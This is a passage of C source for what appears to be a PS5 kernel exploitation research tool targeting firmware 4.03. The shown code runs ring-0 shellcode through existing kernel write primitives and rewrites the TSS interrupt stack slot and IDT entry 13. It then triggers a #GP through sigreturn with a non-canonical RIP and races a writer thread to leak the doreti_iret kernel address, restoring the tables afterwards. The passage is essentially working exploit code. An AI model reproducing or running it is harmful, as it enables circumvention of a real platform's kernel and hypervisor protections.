     * The CPU will push the trap frame starting at IST_TOP - 8 downward. */
    uint64_t ist_stack_top = g_kdata_base + 0x2000;  /* aligned mod 16 */
    uint64_t ist_stack_page_pa = va_to_pa_quiet(g_kdata_base + 0x1000);
    if (!ist_stack_page_pa) {
        printf("[-] IST stack page (kdata+0x1000) PA lookup failed.\n");
        return;
    }
    printf("    IST stack page: kdata+0x1000, PA=0x%lx\n",
           (unsigned long)ist_stack_page_pa);
    printf("    IST stack top:  0x%lx (aligned mod 16)\n",
           (unsigned long)ist_stack_top);

    /* Zero the IST stack page */
    uint8_t zeros[4096];
    memset(zeros, 0, sizeof(zeros));
    kernel_copyin(zeros, g_dmap_base + ist_stack_page_pa, 4096);
    printf("    IST stack page zeroed.\n");

    /* Determine which IST slot to use for #GP.
     * If #GP already has an IST (gp_ist != 0), we'll reconfigure that slot.
     * If it has IST=0 (no IST, uses RSP0), we'll pick a free IST slot
     * and modify the IDT gate to use it. */
    int target_ist = gp_ist;
    int need_idt_modify = 0;

    if (target_ist == 0) {
        /* #GP doesn't use an IST — find a free slot */
        printf("    #GP has IST=0 (uses RSP0). Finding a free IST slot...\n");

        /* Check IST1-7 for unused entries */
        for (int ist = 7; ist >= 1; ist--) {
            uint64_t ist_val;
            memcpy(&ist_val, &tss_data[TSS_IST(ist)], 8);
            /* Check if this IST slot is used by any IDT entry */
            int used = 0;
            for (int v = 0; v < 256; v++) {
                if ((idt_entries[v].ist & 0x7) == ist &&
                    (idt_entries[v].type_attr & 0x80)) {
                    used = 1;
                    break;
                }
            }
            if (!used) {
                target_ist = ist;
                printf("    Found free IST slot: IST%d\n", target_ist);
                break;
            }
        }

        if (target_ist == 0) {
            /* No free IST slot — use IST3 (typically less critical) */
            printf("[!] No free IST slot found. Using IST3 (overriding).\n");
            target_ist = 3;
        }
        need_idt_modify = 1;
    } else {
        printf("    #GP already uses IST%d — will reconfigure that slot.\n", target_ist);
    }
    fflush(stdout);

    /* ── Step 5: Save originals and configure IST + IDT ── */
    printf("\n[*] Step 5: Configuring TSS IST%d and IDT[13]...\n", target_ist);

    /* Save original IST value */
    uint64_t orig_ist_val;
    memcpy(&orig_ist_val, &tss_data[TSS_IST(target_ist)], 8);
    printf("    Original IST%d: 0x%lx\n", target_ist, (unsigned long)orig_ist_val);

    /* Save original IDT[13] entry */
    uint64_t orig_idt13_lo, orig_idt13_hi;
    memcpy(&orig_idt13_lo, &idt_entries[13], 8);
    memcpy(&orig_idt13_hi, (uint8_t *)&idt_entries[13] + 8, 8);

    /* Write IST stack top to TSS IST slot via ring-0.
     * We can't use DMAP for TSS writes on some FW versions
     * (TSS might be in a protected region), so use ring-0 shellcode. */
    printf("    Writing IST%d = 0x%lx via ring-0...\n",
           target_ist, (unsigned long)ist_stack_top);

    uint64_t ist_field_kva = tss_kva + TSS_IST(target_ist);
    uint8_t sc[64];
    int sc_len = build_write64_shellcode(sc, sizeof(sc), ist_field_kva, ist_stack_top);
    if (sc_len < 0) { printf("[-] Shellcode build failed.\n"); return; }

    exec_ring0(sc, sc_len, sysent_kva);

    /* Verify the write by reading back */
    uint64_t ist_verify;
    uint64_t ist_pa = va_to_pa_quiet(ist_field_kva);
    if (ist_pa) {
        kernel_copyout(g_dmap_base + ist_pa, &ist_verify, 8);
        printf("    IST%d readback: 0x%lx [%s]\n", target_ist,
               (unsigned long)ist_verify,
               ist_verify == ist_stack_top ? "OK" : "MISMATCH");
        if (ist_verify != ist_stack_top) {
            printf("[-] IST write failed. Aborting.\n");
            return;
        }
    } else {
        printf("[!] Cannot verify IST write (PA lookup failed). Proceeding anyway.\n");
    }

    /* If we need to modify IDT[13] to use our IST slot */
    if (need_idt_modify) {
        printf("    Modifying IDT[13] to use IST%d...\n", target_ist);

        /* Build new gate: same handler, selector, type, but with new IST */
        uint64_t new_gate_lo, new_gate_hi;
        build_idt_gate(gp_handler, gp_selector, target_ist, gp_type,
                       &new_gate_lo, &new_gate_hi);

        uint64_t idt13_kva = idt_kva + 13 * sizeof(struct idt_entry);
        sc_len = build_write128_shellcode(sc, sizeof(sc), idt13_kva,
                                          new_gate_lo, new_gate_hi);
        if (sc_len < 0) { printf("[-] IDT shellcode build failed.\n"); return; }

        exec_ring0(sc, sc_len, sysent_kva);

        /* Verify */
        struct idt_entry verify_gate;
        uint64_t idt13_pa = va_to_pa_quiet(idt13_kva);
        if (idt13_pa) {
            kernel_copyout(g_dmap_base + idt13_pa, &verify_gate, sizeof(verify_gate));
            printf("    IDT[13] readback: handler=0x%lx, IST=%d [%s]\n",
                   (unsigned long)idt_get_handler(&verify_gate),
                   verify_gate.ist & 0x7,
                   (verify_gate.ist & 0x7) == target_ist ? "OK" : "MISMATCH");
        }
    }
    printf("[+] TSS and IDT configured.\n\n");
    fflush(stdout);

    /* ── Step 6: Compute DMAP write address for overwrite payload ── */

    /* The CPU pushes the iret frame on #GP to the IST stack:
     *   IST_TOP - 8:   SS
     *   IST_TOP - 16:  RSP
     *   IST_TOP - 24:  RFLAGS
     *   IST_TOP - 32:  CS
     *   IST_TOP - 40:  RIP      (= doreti_iret, we want this)
     *   IST_TOP - 48:  Error code
     *
     * We overwrite at IST_TOP - 32 (CS field), 20 bytes:
     *   CS (8 bytes) = 0x43 (user mode)
     *   RFLAGS (8 bytes) = 0x202 (IF set)
     *   RSP_low (4 bytes) = 0 (low 4 bytes of RSP)
     */
    uint64_t overwrite_kva = ist_stack_top - 32;
    uint64_t overwrite_pa = va_to_pa_quiet(overwrite_kva);
    if (!overwrite_pa) {
        /* The IST stack is at kdata+0x1000..0x2000, so the write target
         * (at stack_top - 32 = kdata+0x2000-32 = kdata+0x1FE0) should be
         * on the same page. */
        printf("[-] Overwrite target PA lookup failed (0x%lx).\n",
               (unsigned long)overwrite_kva);
        goto cleanup;
    }
    uint64_t overwrite_dmap = g_dmap_base + overwrite_pa;
    printf("[*] Step 6: Overwrite target:\n");
    printf("    IST stack top:     0x%lx\n", (unsigned long)ist_stack_top);
    printf("    CS field (write):  0x%lx (PA 0x%lx)\n",
           (unsigned long)overwrite_kva, (unsigned long)overwrite_pa);
    printf("    DMAP write addr:   0x%lx\n", (unsigned long)overwrite_dmap);
    fflush(stdout);

    /* ── Step 7: Set up signal handling ── */
    printf("\n[*] Step 7: Setting up signal handlers and alt stack...\n");

    /* Allocate a signal stack (sigaltstack) — needed because our normal
     * RSP will be from kernel and corrupted after the #GP overwrite */
    void *sig_stack = mmap(NULL, 0x10000, PROT_READ | PROT_WRITE,
                           MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    if (sig_stack == MAP_FAILED) {
        printf("[-] Failed to mmap signal stack: %s\n", strerror(errno));
        goto cleanup;
    }

    stack_t ss;
    ss.ss_sp = sig_stack;
    ss.ss_size = 0x10000;
    ss.ss_flags = 0;
    if (sigaltstack(&ss, NULL) != 0) {
        printf("[-] sigaltstack failed: %s\n", strerror(errno));
        goto cleanup;
    }
    printf("    Signal alt stack: 0x%lx (size 0x10000)\n", (unsigned long)sig_stack);

    /* Register SIGBUS handler on the alt stack */
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_sigaction = sigbus_handler;
    sa.sa_flags = SA_SIGINFO | SA_ONSTACK;
    sigemptyset(&sa.sa_mask);
    if (sigaction(SIGBUS, &sa, NULL) != 0) {
        printf("[-] sigaction(SIGBUS) failed: %s\n", strerror(errno));
        goto cleanup;
    }

    /* Also catch SIGSEGV (the kernel may deliver this instead) */
    sa.sa_sigaction = sigsegv_handler;
    if (sigaction(SIGSEGV, &sa, NULL) != 0) {
        printf("[-] sigaction(SIGSEGV) failed: %s\n", strerror(errno));
        goto cleanup;
    }
    printf("    SIGBUS/SIGSEGV handlers registered (SA_ONSTACK).\n");
    fflush(stdout);

    /* ── Step 8: Start writer thread ── */
    printf("\n[*] Step 8: Starting writer thread...\n");

    struct writer_ctx wctx;
    memset(&wctx, 0, sizeof(wctx));
    wctx.write_addr = overwrite_dmap;
    wctx.stop = 0;

    pthread_t writer_tid;
    if (pthread_create(&writer_tid, NULL, writer_thread_func, &wctx) != 0) {
        printf("[-] pthread_create failed: %s\n", strerror(errno));
        goto cleanup;
    }

    /* Wait for writer to start */
    while (!wctx.running) {
        usleep(1000);
    }
    printf("    Writer thread running (writing to DMAP 0x%lx).\n",
           (unsigned long)overwrite_dmap);
    fflush(stdout);

    /* ── Step 9: Trigger #GP with non-canonical sigreturn ── */
    printf("\n[*] Step 9: Triggering #GP via sigreturn with non-canonical RIP...\n");
    printf("    This will cause a controlled kernel crash that we catch as SIGBUS.\n");
    printf("    The mc_rip in the signal context = doreti_iret address.\n\n");
    fflush(stdout);

    /* Flush everything before the dangerous part */
    fflush(stdout);
    fflush(stderr);

    /* First, write our result so far to a temp file in case we crash */
    {
        /* Write known kstuff doreti_iret for comparison */
        uint64_t known_doreti = g_kdata_base + (int64_t)KSTUFF_DORETI_IRET_OFF;
        printf("    Known doreti_iret (kstuff): 0x%lx (ktext+0x%lx)\n",
               (unsigned long)known_doreti,
               (unsigned long)(known_doreti - g_ktext_base));
        printf("    If discovery succeeds, the found value should match.\n\n");
        fflush(stdout);
    }

    /* Build a ucontext with non-canonical RIP and trigger sigreturn.
     *
     * The non-canonical address must have bits 48-63 set to something
     * other than all-0 or all-1 (e.g., 0xDEAD...).
     * This causes the kernel's iret to #GP because iret checks RIP
     * canonicality.
     */
    ucontext_t ctx;
    getcontext(&ctx);

    /* Only trigger once (getcontext returns here after setcontext too) */
    static volatile int triggered = 0;
    if (triggered) {
        /* We returned from the signal handler somehow — should not happen
         * with _exit in the handler, but handle it gracefully */
        printf("[!] Returned from signal context unexpectedly.\n");
        goto post_trigger;
    }
    triggered = 1;

    /* Set non-canonical RIP: top 16 bits = 0xDEAD (non-canonical) */
    ctx.uc_mcontext.mc_rip = 0xDEAD000000001000ULL;

    /* Keep CS as user code segment, RFLAGS normal */
    ctx.uc_mcontext.mc_cs = 0x43;
    ctx.uc_mcontext.mc_rflags = 0x202;

    /* Clear signal mask so signals can be delivered */
    sigemptyset(&ctx.uc_sigmask);

    printf("    Calling setcontext() with mc_rip=0x%lx...\n",
           (unsigned long)ctx.uc_mcontext.mc_rip);
    fflush(stdout);
    fflush(stderr);

    /* This triggers sigreturn in the kernel:
     *   1. Kernel loads our mcontext (including non-canonical RIP)
     *   2. Kernel executes IRET to return to "userspace"
     *   3. IRET #GP's because RIP is non-canonical
     *   4. CPU pushes iret frame to IST stack (our dedicated page)
     *   5. Writer thread overwrites CS/RFLAGS → looks like user fault
     *   6. Kernel delivers SIGBUS to our handler
     *   7. Handler reads mc_rip = doreti_iret address
     */
    setcontext(&ctx);

    /* Should never reach here — setcontext doesn't return on success */
    printf("[!] setcontext() returned unexpectedly!\n");

post_trigger:
    /* Stop writer thread */
    wctx.stop = 1;
    pthread_join(writer_tid, NULL);

    if (g_doreti_iret_addr) {
        uint64_t known_doreti = g_kdata_base + (int64_t)KSTUFF_DORETI_IRET_OFF;

        printf("\n[+] ============================================\n");
        printf("[+]  doreti_iret DISCOVERED!\n");
        printf("[+] ============================================\n");
        printf("[+]  Found:    0x%016lx\n", (unsigned long)g_doreti_iret_addr);
        printf("[+]  Expected: 0x%016lx\n", (unsigned long)known_doreti);
        printf("[+]  Match:    %s\n",
               g_doreti_iret_addr == known_doreti ? "YES" : "NO");
        if (g_doreti_iret_addr >= g_ktext_base &&
            g_doreti_iret_addr < g_ktext_base + 0x2000000)
            printf("[+]  ktext offset: 0x%lx\n",
                   (unsigned long)(g_doreti_iret_addr - g_ktext_base));
        printf("[+]  Signal: %d (%s)\n", g_signal_received,
               g_signal_received == SIGBUS ? "SIGBUS" :
               g_signal_received == SIGSEGV ? "SIGSEGV" : "other");

        notify("[HV Research] doreti_iret found!");
    } else {
        printf("\n[-] doreti_iret NOT discovered.\n");
        printf("    Signal received: %d\n", g_signal_received);
        notify("[HV Research] doreti_iret discovery FAILED");
    }

cleanup:
    /* Restore IST and IDT to original values */
    printf("\n[*] Cleanup: Restoring TSS and IDT...\n");

    /* Restore IST slot */
    sc_len = build_write64_shellcode(sc, sizeof(sc), ist_field_kva, orig_ist_val);
    if (sc_len > 0) {
        exec_ring0(sc, sc_len, sysent_kva);
        printf("    IST%d restored to 0x%lx\n", target_ist, (unsigned long)orig_ist_val);
    }

    /* Restore IDT[13] if modified */
    if (need_idt_modify) {
        uint64_t idt13_kva = idt_kva + 13 * sizeof(struct idt_entry);
        sc_len = build_write128_shellcode(sc, sizeof(sc), idt13_kva,
                                          orig_idt13_lo, orig_idt13_hi);
        if (sc_len > 0) {
            exec_ring0(sc, sc_len, sysent_kva);
            printf("    IDT[13] restored.\n");
        }
    }

    /* Zero the IST stack page to clean up */
    kernel_copyin(zeros, g_dmap_base + ist_stack_page_pa, 4096);
    printf("    IST stack page zeroed.\n");

    printf("[+] Cleanup complete.\n");
    fflush(stdout);
}

/* ─── Main ─── */

int main(void) {
    notify("[HV Research2] doreti_iret discovery starting");

    FILE *f = fopen("/data/etaHEN/hv_research2.log", "w");
    if (f) {
        fclose(f);
        freopen("/data/etaHEN/hv_research2.log", "w", stdout);
        freopen("/data/etaHEN/hv_research2.log", "a", stderr);
        setvbuf(stdout, NULL, _IOLBF, 0);
        setvbuf(stderr, NULL, _IOLBF, 0);
    }

    printf("\n");
    printf("==============================================\n");
    printf("  PS5 doreti_iret Discovery Tool\n");
    printf("  Target: FW 4.03\n");
    printf("  Based on flatz's porting guide\n");
    printf("==============================================\n\n");
    fflush(stdout);

    /* Initialize */
    if (init_fw_offsets() != 0) {
        printf("[-] Failed to init FW offsets\n");
        return 1;
    }

    if (discover_dmap_base() != 0) {
        printf("[-] Failed to discover DMAP base — cannot proceed\n");
        return 1;
    }

    /* Run doreti_iret discovery */
    campaign_doreti_iret();

    printf("\n==============================================\n");
    printf("  doreti_iret discovery complete.\n");
    printf("==============================================\n");

    fflush(stdout);
    fflush(stderr);

    notify("[HV Research2] Done! Check /data/etaHEN/hv_research2.log");

    return 0;
}
